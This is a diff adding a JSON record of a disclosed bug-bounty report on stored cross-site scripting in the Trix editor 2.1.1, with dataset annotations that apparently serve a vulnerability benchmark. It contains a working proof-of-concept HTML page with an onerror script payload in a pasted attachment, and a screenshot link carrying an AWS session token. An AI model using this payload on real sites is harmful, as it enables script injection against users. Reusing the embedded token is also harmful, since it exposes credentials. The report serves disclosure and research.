@@ -1,0 +1,47 @@
+{
+  "reported_to": "Basecamp",
+  "reported_by": "thwin_htet ",
+  "title": "Stored XSS on trix editor version 2.1.1",
+  "content": "\nThe Trix editor is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.\nVulnerable Version\n2.1.1\nSteps to Reproduce\nRun this HTML code on browser.\nCode 595 Bytes\n1<!DOCTYPE html>\n2<html lang=\"en\">\n3<head>\n4  <meta charset=\"UTF-8\">\n5  <title>Trix Editor XSS Demo</title>\n6  <script src=\"https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.umd.min.js\"></script>\n7  <link href=\"https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css\" rel=\"stylesheet\">\n8</head>\n9<body>\n10  <h1>Trix Editor XSS Demo</h1>\n11  <trix-editor></trix-editor>\n12  <script>\n13  document.write(`copy<div data-trix-attachment=\"{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;img src=1 onerror=alert(document.domain)&gt;XSS POC&quot;}\"></div>me`);\n14  </script>\n15</body>\n16</html>\nClick copy me and paste it in trix editor.\n<image_0>\nAlert will pop up.\nThis could be a bypass of recent Trix Editor CVE : CVE-2024-34341\nRef : https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99\nImpact\nAn attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.\n\n",
+  "severity": [
+    8.1,
+    null
+  ],
+  "bounty": 1000,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2gnpe3ei9cytqdpkxyyldj5887c1?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUMFBJSG5%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T204428Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFZuqlSX62MWhAr2BKxofV%2BULLbJUGShROYuJwTzwxSHAiABsJuF3X%2BSFrH06L4Cm0FwhT9iXitSnRhmo40I6nd8tyq7BQjz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMPKZSz1zhJ%2BHgQpSGKo8FyQdojXMTrsTk7gorsU9P9opgY1BMpc2s2pcZdb0IzeGoA0JbJ9kgHmT99F4ZKuYbe9pOszMBjS9rXnQDHimGVzsLMRIyiwjsfPW00dA%2B%2BYEHsNwY%2FsFRRcw4%2FxU2MCGlTB%2BcdM4EipVKrCm7E%2FwFvk5Hx1WfV4K8GUGpTA17IwoV%2BhtxxmvZ0CV9PEtZWDIpCr8RT8%2BnQTsHKgMK2kIs%2BEeyedkdK5MHE1tcLzSOsoP7YKJlIn2Q8ugaDePU65CB3DAqGuTTvs3dRm9lXokoig8ZqbQ3bdVwiZ%2B5Oi9VpWuLH5KzV0IELXHUsDIChejbRPmQCZrmT0CNOIhhqzovtswvvU4FwGna6lTeB62A1cNTbgvW2BtdNBKMs7rYOumrI91eiTL351ATJmAYV6q7o417mV9tn9uqSk%2FBEiVZxMD4JUkYPyKaMPQStS%2BFHweJYwg%2FmWGv3otMytmiH2mGaz%2FQ%2FozJZNGJyqr9LKM8WKa4UaLtDSAj%2F8m8Nm0URUoWZnlEunOqteIQqyZowgBa924y%2FIQAvYDQ9G0KS7Sugi9cePAUL%2Bs7NYLr%2FT8QfO4W5xub9xMTNIY80D4Tkd9xe7FfcU8JaKDZlwEZ8WiQVykzqFFPGHY5asHPkJiumQqDiWJLXKvO6gCzI3EOjuwbbXgXL9TSqx5LH0mMuffK3NStibdL9DWLzsXHPrg7W3xUwDmMrDvw2%2FM3qXKS76rRkCoc3X5blQSRMzRcFw7uXpU92bko9wZL4%2F5aiVDlGZjeUCzQaj3i7f8q7P63u%2F10bAFYv4hnpdSVVPbmfXMX3hmGqzjKRPxs1%2FjWgmOWeqmgfedj0XLSy5oV9z6i%2BNEewEMSxJlhMp34t%2FLYtfN4GjDHwoa%2FBjqyAT0SVyRHJU%2FUtwNZn6uXvfp3fv8d0PHp7EbAvFcLYLenK7abBQO%2BFFO2dYtDDnKKf0GmTP7zPSnJd6rbIJd5tKh7xLgpE8ZbhwmRMyp6enZ5cIc5qZrYxv0KpWMx33dg2eVM6bw3Lrs27d5VZsOYqa7ts%2Fgd95uXq4BxzNDIciREtU3McOmr56lveNVNk0rZ3eFyQU54HkSCoXgVzvi5XGQG%2BHfCMmyHVBhIDpBAiDS4f%2Bk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e6e955f0f897132b67387d4d82e1cbe4ca1678ff1852764646d1ba57772c4302"
+  },
+  "disclosed_date": 1730743080,
+  "report_url": "https://hackerone.com/reports/2521419",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Load the HTML code in a browser with Trix editor version 2.1.1"
+    ],
+    [
+      2,
+      "Copy the text 'copy me' and paste it into the Trix editor to trigger the XSS payload"
+    ]
+  ],
+  "vuln_description": "The Trix editor version 2.1.1 is vulnerable to stored XSS when copying and pasting content from the web or other documents with markup. The improper sanitization of pasted content allows embedding malicious scripts that execute within the application's context.",
+  "reason": "The vulnerability involves a straightforward exploitation of improper sanitization in a known editor. The attack is simple and does not require complex interactions or state manipulation.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves improper sanitization of pasted content in the Trix editor, which is a client-side issue. The proposed methodologies focus on server-side authentication and authorization checks (AuthN/AuthZ) and IDOR vulnerabilities, which are not applicable to this client-side XSS vulnerability.",
+    "is_detectable": false
+  }
+}
